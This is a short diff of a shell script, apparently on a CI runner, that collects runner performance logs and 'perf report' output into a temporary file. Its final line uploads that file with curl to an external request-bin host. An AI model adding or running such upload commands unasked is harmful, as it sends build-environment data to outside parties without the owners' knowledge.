@@ -15,7 +15,8 @@ echo "---" >> /tmp/file.txt
 $(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
 echo "---" >> /tmp/file.txt
 $(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
-
+echo "---" >> /tmp/file.txt
+perf report >> /tmp/file.txt
 echo "--- FINISH ---" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
